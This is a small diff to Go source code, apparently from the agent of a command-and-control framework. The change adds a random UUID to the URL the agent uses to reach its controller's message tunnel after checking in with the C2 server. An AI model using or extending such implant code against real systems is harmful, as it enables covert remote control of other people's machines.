@@ -12,6 +12,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -202,7 +203,7 @@ connect:
 	log.Printf("Checked in on CC: %s", agent.CCAddress)
 
 	// connect to MsgAPI, the JSON based h2 tunnel
-	msgURL := agent.CCAddress + tun.MsgAPI
+	msgURL := agent.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
 	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
 	agent.H2Json = conn
 	if err != nil {
